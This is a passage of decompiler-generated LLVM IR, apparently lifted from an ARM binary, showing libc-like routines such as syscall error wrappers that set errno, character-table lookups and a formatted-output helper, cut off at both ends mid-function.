  %v1_12974 = phi i32 [ %v0_12948, %dec_label_pc_1290c ], [ -1, %dec_label_pc_12958 ]
  ret i32 %v1_12974

; uselistorder directives
  uselistorder i32 %v0_12948, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12968, { 1, 0 }
}

define i32 @function_12978(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12978:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12978 = load i32, i32* @r7, align 4
  store i32 %v3_12978, i32* %stack_var_-8, align 4
  %v0_12984 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12984, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12984, -4095
  br i1 %tmp, label %dec_label_pc_129a4, label %dec_label_pc_12994

dec_label_pc_12994:                               ; preds = %dec_label_pc_12978
  %v0_12994 = call i32 @function_12b24()
  %v0_12998 = load i32, i32* %r7.global-to-local, align 4
  %v1_12998 = sub i32 0, %v0_12998
  %v2_1299c = inttoptr i32 %v0_12994 to i32*
  store i32 %v1_12998, i32* %v2_1299c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_129a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_129a4

dec_label_pc_129a4:                               ; preds = %dec_label_pc_12978, %dec_label_pc_12994
  %v1_129a8 = phi i32 [ %v0_12984, %dec_label_pc_12978 ], [ -1, %dec_label_pc_12994 ]
  %v2_129a4 = phi i32 [ %v3_12978, %dec_label_pc_12978 ], [ %v2_129a4.pre, %dec_label_pc_12994 ]
  store i32 %v2_129a4, i32* @r7, align 4
  ret i32 %v1_129a8

; uselistorder directives
  uselistorder i32 %v0_12984, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_129a4, { 1, 0 }
}

define i32 @function_129ac() local_unnamed_addr {
dec_label_pc_129ac:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_129ac = load i32, i32* @r7, align 4
  store i32 %v3_129ac, i32* %stack_var_-8, align 4
  %v0_129b8 = load i32, i32* @r0, align 4
  store i32 %v0_129b8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_129b8, -4095
  br i1 %tmp, label %dec_label_pc_129d8, label %dec_label_pc_129c8

dec_label_pc_129c8:                               ; preds = %dec_label_pc_129ac
  %v0_129c8 = call i32 @function_12b24()
  %v0_129cc = load i32, i32* %r7.global-to-local, align 4
  %v1_129cc = sub i32 0, %v0_129cc
  %v2_129d0 = inttoptr i32 %v0_129c8 to i32*
  store i32 %v1_129cc, i32* %v2_129d0, align 4
  %v2_129d8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129ac, %dec_label_pc_129c8
  %v1_129dc = phi i32 [ %v0_129b8, %dec_label_pc_129ac ], [ -1, %dec_label_pc_129c8 ]
  %v2_129d8 = phi i32 [ %v3_129ac, %dec_label_pc_129ac ], [ %v2_129d8.pre, %dec_label_pc_129c8 ]
  store i32 %v2_129d8, i32* @r7, align 4
  ret i32 %v1_129dc

; uselistorder directives
  uselistorder i32 %v0_129b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_129d8, { 1, 0 }
}

define i32 @function_129e0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_129e0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_129e0 = load i32, i32* @r3, align 4
  store i32 %v9_129e0, i32* %stack_var_-4, align 4
  %v2_129ec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_129ec, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12a20, label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %dec_label_pc_129e0
  %v0_12a10 = call i32 @function_12b24()
  %v0_12a14 = load i32, i32* %r7.global-to-local, align 4
  %v1_12a14 = sub i32 0, %v0_12a14
  store i32 %v1_12a14, i32* @r3, align 4
  %v2_12a18 = inttoptr i32 %v0_12a10 to i32*
  store i32 %v1_12a14, i32* %v2_12a18, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12a20

dec_label_pc_12a20:                               ; preds = %dec_label_pc_129e0, %dec_label_pc_12a10
  %v0_12a20 = phi i32 [ %arg1, %dec_label_pc_129e0 ], [ -1, %dec_label_pc_12a10 ]
  ret i32 %v0_12a20

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a20, { 1, 0 }
}

define i32 @function_12a34(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a34:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a38.outer

dec_label_pc_12a38.outer:                         ; preds = %dec_label_pc_12a50, %dec_label_pc_12a34
  %v0_12a38.ph = phi i32 [ %v0_12a38.pre.pre, %dec_label_pc_12a50 ], [ %arg1, %dec_label_pc_12a34 ]
  %tmp = icmp ult i32 %v0_12a38.ph, -4095
  br label %dec_label_pc_12a38

dec_label_pc_12a38:                               ; preds = %dec_label_pc_12a38.outer, %dec_label_pc_12a38
  br i1 %tmp, label %dec_label_pc_12a38, label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a38
  %v0_12a50 = call i32 @function_12b24()
  %v1_12a54 = sub i32 0, %v0_12a38.ph
  %v2_12a58 = inttoptr i32 %v0_12a50 to i32*
  store i32 %v1_12a54, i32* %v2_12a58, align 4
  %v0_12a38.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a38.outer

; uselistorder directives
  uselistorder i32 %v0_12a38.ph, { 1, 0 }
  uselistorder label %dec_label_pc_12a38, { 1, 0 }
}

define i32 @function_12a60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12a60:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a60 = load i32, i32* @r7, align 4
  store i32 %v3_12a60, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12a8c, label %dec_label_pc_12a7c

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a60
  %v0_12a7c = call i32 @function_12b24()
  %v0_12a80 = load i32, i32* %r7.global-to-local, align 4
  %v1_12a80 = sub i32 0, %v0_12a80
  %v2_12a84 = inttoptr i32 %v0_12a7c to i32*
  store i32 %v1_12a80, i32* %v2_12a84, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12a90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %dec_label_pc_12a60, %dec_label_pc_12a7c
  %v2_12a90 = phi i32 [ %v3_12a60, %dec_label_pc_12a60 ], [ %v2_12a90.pre, %dec_label_pc_12a7c ]
  %v0_12a8c = phi i32 [ %arg1, %dec_label_pc_12a60 ], [ -1, %dec_label_pc_12a7c ]
  store i32 %v2_12a90, i32* @r7, align 4
  ret i32 %v0_12a8c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a8c, { 1, 0 }
}

define i32 @function_12a98(i32 %arg1) local_unnamed_addr {
dec_label_pc_12a98:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12a98 = load i32, i32* @r7, align 4
  store i32 %v3_12a98, i32* %stack_var_-8, align 4
  %v0_12aa4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12aa4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12aa4, -4095
  br i1 %tmp, label %dec_label_pc_12ac4, label %dec_label_pc_12ab4

dec_label_pc_12ab4:                               ; preds = %dec_label_pc_12a98
  %v0_12ab4 = call i32 @function_12b24()
  %v0_12ab8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12ab8 = sub i32 0, %v0_12ab8
  %v2_12abc = inttoptr i32 %v0_12ab4 to i32*
  store i32 %v1_12ab8, i32* %v2_12abc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12ac4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12ac4

dec_label_pc_12ac4:                               ; preds = %dec_label_pc_12a98, %dec_label_pc_12ab4
  %v1_12ac8 = phi i32 [ %v0_12aa4, %dec_label_pc_12a98 ], [ -1, %dec_label_pc_12ab4 ]
  %v2_12ac4 = phi i32 [ %v3_12a98, %dec_label_pc_12a98 ], [ %v2_12ac4.pre, %dec_label_pc_12ab4 ]
  store i32 %v2_12ac4, i32* @r7, align 4
  ret i32 %v1_12ac8

; uselistorder directives
  uselistorder i32 %v0_12aa4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ac4, { 1, 0 }
}

define i32 @function_12acc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12acc:
  %v4_12ad8 = load i32, i32* inttoptr (i32 181784 to i32*), align 8
  %v2_12adc = mul i32 %arg1, 2
  %v2_12ae0 = add i32 %v4_12ad8, %v2_12adc
  %v3_12ae0 = inttoptr i32 %v2_12ae0 to i16*
  %v4_12ae0 = load i16, i16* %v3_12ae0, align 2
  %v6_12ae0 = zext i16 %v4_12ae0 to i32
  %v1_12ae4 = and i32 %v6_12ae0, 32
  ret i32 %v1_12ae4
}

define i32 @function_12af4(i32 %arg1) local_unnamed_addr {
dec_label_pc_12af4:
  %v1_12af8 = add i32 %arg1, 128
  %v2_12afc = icmp ugt i32 %v1_12af8, 383
  %v0_12b04 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12afc, i32 %v0_12b04)
  %v4_12b0c = load i32, i32* inttoptr (i32 181792 to i32*), align 32
  %v2_12b10 = mul i32 %arg1, 2
  %v2_12b14 = add i32 %v4_12b0c, %v2_12b10
  %v3_12b14 = inttoptr i32 %v2_12b14 to i16*
  %v4_12b14 = load i16, i16* %v3_12b14, align 2
  %v6_12b14 = sext i16 %v4_12b14 to i32
  ret i32 %v6_12b14
}

define i32 @function_12b24() local_unnamed_addr {
dec_label_pc_12b24:
  store i32 180260, i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_32ac0.693 to i32)
}

define i32 @function_12b40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12b40:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_12b4c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_12b4c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_12b60 = call i32 @function_12b74()
  ret i32 %v0_12b60

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_12b74() local_unnamed_addr {
dec_label_pc_12b74:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_12b74 = load i32, i32* @r4, align 4
  %v6_12b74 = load i32, i32* @r5, align 4
  %v9_12b74 = load i32, i32* @r6, align 4
  %v12_12b74 = load i32, i32* @r7, align 4
  %v18_12b74 = load i32, i32* @sl, align 4
  %v2_12b7c = ptrtoint i32* %stack_var_-112 to i32
  %v0_12b80 = load i32, i32* @r0, align 4
  store i32 %v0_12b80, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_12b88 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12b88, i32* @r0, align 4
  %v0_12b90 = load i32, i32* @r3, align 4
  store i32 %v0_12b90, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_12b9c = load i32, i32* @r1, align 4
  store i32 %v0_12b9c, i32* @r5, align 4
  %v0_12ba0 = load i32, i32* @r2, align 4
  store i32 %v0_12ba0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_12bb4 = call i32 @function_12c90(i32 %v2_12b88)
  %v0_12bb8 = load i32, i32* @r4, align 4
  %v1_12bb8 = sub i32 -1, %v0_12bb8
  %v0_12bbc = load i32, i32* @r5, align 4
  %v3_12bbc = icmp ult i32 %v0_12bbc, %v1_12bb8
  br i1 %v3_12bbc, label %bb24, label %bb

bb:                                               ; preds = %dec_label_pc_12b74
  store i32 %v1_12bb8, i32* @r5, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_12b74, %bb
  %v1_12bc4 = phi i32 [ %v0_12bbc, %dec_label_pc_12b74 ], [ %v1_12bb8, %bb ]
  %v0_12bcc = load i32, i32* @r6, align 4
  %v0_12bd0 = load i32, i32* @r7, align 4
  %v3_12bf0 = inttoptr i32 %v0_12bcc to i8*
  %v4_12bf0 = call i32 @function_12ea0(i32 %v2_12b7c, i8* %v3_12bf0, i32 %v0_12bd0)
  %v0_12bf4 = load i32, i32* @r5, align 4
  %v1_12bf4 = load i32, i32* @sl, align 4
  %v9_12bf4 = icmp eq i32 %v0_12bf4, %v1_12bf4
  br i1 %v9_12bf4, label %dec_label_pc_12c1c, label %dec_label_pc_12c00

dec_label_pc_12c00:                               ; preds = %bb24
  %v2_12bc4 = add i32 %v1_12bc4, %v0_12bb8
  %v9_12c08 = icmp eq i32 %v1_12bc4, 0
  br i1 %v9_12c08, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_12c00
  %v2_12c0c = add i32 %v0_12bb8, -1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_12c00, %bb25
  %v1_12c10 = phi i32 [ %v2_12bc4, %dec_label_pc_12c00 ], [ %v2_12c0c, %bb25 ]
  %v1_12c10.v0_12be8 = select i1 %v9_12c08, i32 %v1_12c10, i32 %v0_12bb8
  %stack_var_-96.0 = inttoptr i32 %v1_12c10.v0_12be8 to i8*
  %v1_12c18 = trunc i32 %v1_12bf4 to i8
  store i8 %v1_12c18, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %bb24, %bb26
  store i32 %v3_12b74, i32* @r4, align 4
  store i32 %v6_12b74, i32* @r5, align 4
  store i32 %v9_12b74, i32* @r6, align 4
  store i32 %v12_12b74, i32* @r7, align 4
  store i32 %v18_12b74, i32* @sl, align 4
  ret i32 %v4_12bf0

; uselistorder directives
  uselistorder i1 %v9_12c08, { 1, 0 }
  uselistorder i32 %v1_12bc4, { 1, 0 }
  uselistorder i32 %v1_12bb8, { 2, 1, 0 }
  uselistorder i32 %v0_12bb8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12c1c, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
}

define i32 @function_12c28(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12c28:
  %v0_12c2c = call i32 @function_12b24()
  store i32 %v0_12c2c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_12c38 = inttoptr i32 %v0_12c2c to i32*
  %v2_12c38 = load i32, i32* %v1_12c38, align 4
  store i32 %v2_12c38, i32* @r6, align 4
  %v1_12c3c = call i32 @function_145ac(i32 0)
  %v2_12c44 = icmp eq i32 %v1_12c3c, 0
  store i32 180260, i32* @r4, align 4
  br i1 %v2_12c44, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12c28
  %v5_12c50 = load i16, i16* inttoptr (i32 181872 to i16*), align 16
  %v7_12c50 = zext i16 %v5_12c50 to i32
  %v2_12c54 = xor i32 %v7_12c50, 256
  store i32 %v2_12c54, i32* @r3, align 4
  %v2_12c58 = trunc i32 %v2_12c54 to i16
  store i16 %v2_12c58, i16* inttoptr (i32 181872 to i16*), align 16
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12c28, %bb
  store i32 1, i32* @r0, align 4
  %v1_12c60 = call i32 @function_145ac(i32 1)
  %v2_12c64 = icmp eq i32 %v1_12c60, 0
  br i1 %v2_12c64, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_12c6c = load i32, i32* @r4, align 4
  %v2_12c70 = add i32 %v1_12c6c, 1692
  %v3_12c70 = inttoptr i32 %v2_12c70 to i16*
  %v4_12c70 = load i16, i16* %v3_12c70, align 2
  %v2_12c74 = xor i16 %v4_12c70, 256
  store i16 %v2_12c74, i16* %v3_12c70, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_12c7c = load i32, i32* @r6, align 4
  %v1_12c7c = load i32, i32* @r5, align 4
  %v2_12c7c = inttoptr i32 %v1_12c7c to i32*
  store i32 %v0_12c7c, i32* %v2_12c7c, align 4
  ret i32 %v1_12c60

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12c90(i32 %arg1) local_unnamed_addr {
dec_label_pc_12c90:
  store i32 180260, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_22c08.698 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_12cac = call i32 @function_14000()
  ret i32 %v0_12cac
}

define i32 @function_12d60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_12d60:
  %v0_12d60.pre = load i32, i32* @r4, align 4
  br label %bb

bb:                                               ; preds = %bb9, %dec_label_pc_12d60
  %v1_12d68 = phi i32 [ %v0_12d60.pre, %dec_label_pc_12d60 ], [ %v3_12d70, %bb9 ]
  %.0 = phi i32 [ undef, %dec_label_pc_12d60 ], [ %.1, %bb9 ]
  %v1_12d60 = inttoptr i32 %v1_12d68 to i16*
  %v2_12d60 = load i16, i16* %v1_12d60, align 2
  %v1_12d64 = and i16 %v2_12d60, 64
  %v2_12d64 = icmp eq i16 %v1_12d64, 0
  br i1 %v2_12d64, label %bb9, label %bb8

bb8:                                              ; preds = %bb
  br label %bb9

bb9:                                              ; preds = %bb, %bb8
  %.1 = phi i32 [ %.0, %bb ], [ %v1_12d68, %bb8 ]
  %v1_12d6c = xor i1 %v2_12d64, true
  call void @__pseudo_cond_branch(i1 %v1_12d6c, i32 ptrtoint (i32* @global_var_12d98.699 to i32))
  %v0_12d70 = load i32, i32* @r4, align 4
  %v1_12d70 = add i32 %v0_12d70, 32
  %v2_12d70 = inttoptr i32 %v1_12d70 to i32*
  %v3_12d70 = load i32, i32* %v2_12d70, align 4
  store i32 %v3_12d70, i32* @r4, align 4
  %v2_12d74 = icmp eq i32 %v3_12d70, 0
  br i1 %v2_12d74, label %dec_label_pc_12d7c, label %bb

dec_label_pc_12d7c:                               ; preds = %bb9
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v3_12d70, { 1, 2, 0 }
  uselistorder i1 %v2_12d64, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_12d88(i32 %arg1) local_unnamed_addr {
dec_label_pc_12d88:
  %v0_12d88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d88, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12d88
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12d88, %bb
  %v4_12d94 = phi i32 [ %arg1, %dec_label_pc_12d88 ], [ 0, %bb ]
  ret i32 %v4_12d94

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12d98() local_unnamed_addr {
dec_label_pc_12d98:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12d98 = load i32, i32* @r4, align 4
  store i32 %v3_12d98, i32* %stack_var_-8, align 4
  %v0_12d9c = load i32, i32* @r0, align 4
  %v1_12d9c = add i32 %v0_12d9c, 8
  %v2_12d9c = inttoptr i32 %v1_12d9c to i32*
  %v3_12d9c = load i32, i32* %v2_12d9c, align 4
  %v1_12da0 = add i32 %v0_12d9c, 16
  %v2_12da0 = inttoptr i32 %v1_12da0 to i32*
  %v3_12da0 = load i32, i32* %v2_12da0, align 4
  %v9_12da4 = icmp eq i32 %v3_12da0, %v3_12d9c
  store i32 %v0_12d9c, i32* %r4.global-to-local, align 4
  br i1 %v9_12da4, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_12d98
  store i32 %v3_12d9c, i32* %v2_12da0, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_12d98, %bb
  %v1_12db0 = xor i1 %v9_12da4, true
  call void @__pseudo_cond_branch(i1 %v1_12db0, i32 ptrtoint (i32* @global_var_18124.700 to i32))
  %v0_12db4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12db4 = add i32 %v0_12db4, 8
  %v2_12db4 = inttoptr i32 %v1_12db4 to i32*
  %v3_12db4 = load i32, i32* %v2_12db4, align 4
  %v1_12db8 = add i32 %v0_12db4, 16
  %v2_12db8 = inttoptr i32 %v1_12db8 to i32*
  %v3_12db8 = load i32, i32* %v2_12db8, align 4
  %v2_12dbc = sub i32 %v3_12db8, %v3_12db4
  %v2_12dc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12dc0, i32* @r4, align 4
  ret i32 %v2_12dbc

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_12dc8(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12dc8:
  %stack_var_-25 = alloca i8, align 1
  %v3_12dc8 = load i32, i32* @r4, align 4
  %v6_12dc8 = load i32, i32* @r5, align 4
  %v9_12dc8 = load i32, i32* @r6, align 4
  %v12_12dc8 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_12dd4 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_12dd4, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_12dec2 = icmp eq i32 %arg3, 0
  br i1 %v2_12dec2, label %dec_label_pc_12e0c, label %dec_label_pc_12e00

dec_label_pc_12de8:                               ; preds = %dec_label_pc_12e00
  %v1_12de8 = add i32 %v0_12de8, -1
  store i32 %v1_12de8, i32* @r4, align 4
  %v2_12dec = icmp eq i32 %v1_12de8, 0
  %v0_12df8 = load i32, i32* @r7, align 4
  br i1 %v2_12dec, label %dec_label_pc_12e0c.loopexit, label %dec_label_pc_12e00

dec_label_pc_12e00:                               ; preds = %dec_label_pc_12dc8, %dec_label_pc_12de8
  %v0_12df84 = phi i32 [ %v0_12df8, %dec_label_pc_12de8 ], [ %arg1, %dec_label_pc_12dc8 ]
  %v3_12e00 = inttoptr i32 %v0_12df84 to i16*
  %v4_12e00 = call i32 @function_184e0(i32 %v10_12dd4, i32 1, i16* %v3_12e00)
  %v7_12e04 = icmp eq i32 %v4_12e00, 1
  %v0_12de8 = load i32, i32* @r4, align 4
  br i1 %v7_12e04, label %dec_label_pc_12de8, label %dec_label_pc_12e0c.loopexit

dec_label_pc_12e0c.loopexit:                      ; preds = %dec_label_pc_12de8, %dec_label_pc_12e00
  %v0_12e0c.ph = phi i32 [ %v0_12de8, %dec_label_pc_12e00 ], [ 0, %dec_label_pc_12de8 ]
  %v1_12e0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12e0c.loopexit, %dec_label_pc_12dc8
  %v1_12e0c = phi i32 [ 0, %dec_label_pc_12dc8 ], [ %v1_12e0c.pre, %dec_label_pc_12e0c.loopexit ]
  %v0_12e0c = phi i32 [ 0, %dec_label_pc_12dc8 ], [ %v0_12e0c.ph, %dec_label_pc_12e0c.loopexit ]
  %v2_12e0c = sub i32 %v1_12e0c, %v0_12e0c
  store i32 %v3_12dc8, i32* @r4, align 4
  store i32 %v6_12dc8, i32* @r5, align 4
  store i32 %v9_12dc8, i32* @r6, align 4
  store i32 %v12_12dc8, i32* @r7, align 4
  ret i32 %v2_12e0c

; uselistorder directives
  uselistorder i32 %v1_12de8, { 1, 0 }
  uselistorder label %dec_label_pc_12e0c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_12e00, { 1, 0 }
}

define i32 @function_12e1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12e1c:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e1c = load i32, i32* @r4, align 4
  store i32 %v3_12e1c, i32* %stack_var_-24, align 4
  %v6_12e1c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_12e24 = and i32 %arg2, 128
  %v2_12e24 = icmp eq i32 %v1_12e24, 0
  %v0_12e28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12e28, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_12e24, label %dec_label_pc_12e78thread-pre-split, label %dec_label_pc_12e3c

dec_label_pc_12e3c:                               ; preds = %dec_label_pc_12e1c
  store i32 %arg4, i32* @r0, align 4
  %v0_12e40 = call i32 @function_13f70()
  store i32 %v0_12e40, i32* %r0.global-to-local, align 4
  %v1_12e44 = load i32, i32* %r4.global-to-local, align 4
  %v2_12e44 = sub i32 %v1_12e44, %v0_12e40
  store i32 %v2_12e44, i32* @r4, align 4
  store i32 %v0_12e40, i32* @r6, align 4
  %tmp12 = icmp slt i32 %v2_12e44, 1
  br i1 %tmp12, label %.thread, label %dec_label_pc_12e58

.thread:                                          ; preds = %dec_label_pc_12e3c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e74

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12e3c
  %v0_12e58 = load i32, i32* @r5, align 4
  %v1_12e58 = urem i32 %v0_12e58, 128
  %v0_12e5c = load i32, i32* @r8, align 4
  store i32 %v0_12e5c, i32* %r0.global-to-local, align 4
  %v3_12e64 = trunc i32 %v1_12e58 to i8
  %v4_12e64 = call i32 @function_12dc8(i32 %v0_12e5c, i8 %v3_12e64, i32 %v2_12e44)
  store i32 %v4_12e64, i32* %r0.global-to-local, align 4
  %v1_12e68 = load i32, i32* @r4, align 4
  %v9_12e68 = icmp eq i32 %v4_12e64, %v1_12e68
  store i32 %v4_12e64, i32* %r5.global-to-local, align 4
  br i1 %v9_12e68, label %dec_label_pc_12e58.dec_label_pc_12e74_crit_edge, label %dec_label_pc_12e94

dec_label_pc_12e58.dec_label_pc_12e74_crit_edge:  ; preds = %dec_label_pc_12e58
  %v0_12e74.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12e74

dec_label_pc_12e74:                               ; preds = %.thread, %dec_label_pc_12e58.dec_label_pc_12e74_crit_edge
  %v0_12e74 = phi i32 [ %v0_12e74.pre, %dec_label_pc_12e58.dec_label_pc_12e74_crit_edge ], [ %v0_12e40, %.thread ]
  store i32 %v0_12e74, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e78

dec_label_pc_12e78thread-pre-split:               ; preds = %dec_label_pc_12e1c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e78

dec_label_pc_12e78:                               ; preds = %dec_label_pc_12e78thread-pre-split, %dec_label_pc_12e74
  %v5_12e84 = phi i32 [ %arg3, %dec_label_pc_12e78thread-pre-split ], [ %v0_12e74, %dec_label_pc_12e74 ]
  %tmp13 = icmp slt i32 %v5_12e84, 1
  br i1 %tmp13, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_12e78
  br label %bb14

bb:                                               ; preds = %dec_label_pc_12e78
  %v5_12e80 = load i32, i32* @r7, align 4
  br label %bb14

bb14:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_12e80, %bb ]
  %tmp15 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp15, i32 ptrtoint (i32* @global_var_184e0.701 to i32))
  %v0_12e90 = load i32, i32* %r5.global-to-local, align 4
  %v2_12e90 = add i32 %storemerge, %v0_12e90
  store i32 %v2_12e90, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e58, %bb14
  %v0_12e94 = phi i32 [ %v4_12e64, %dec_label_pc_12e58 ], [ %v2_12e90, %bb14 ]
  store i32 %v0_12e94, i32* %r0.global-to-local, align 4
  %v2_12e98 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12e98, i32* %r4.global-to-local, align 4
  store i32 %v6_12e1c, i32* %r5.global-to-local, align 4
  ret i32 %v0_12e94

; uselistorder directives
  uselistorder i32 %v0_12e94, { 1, 0 }
  uselistorder i32 %v0_12e74, { 1, 0 }
  uselistorder i32 %v2_12e44, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 6, 1, 2 }
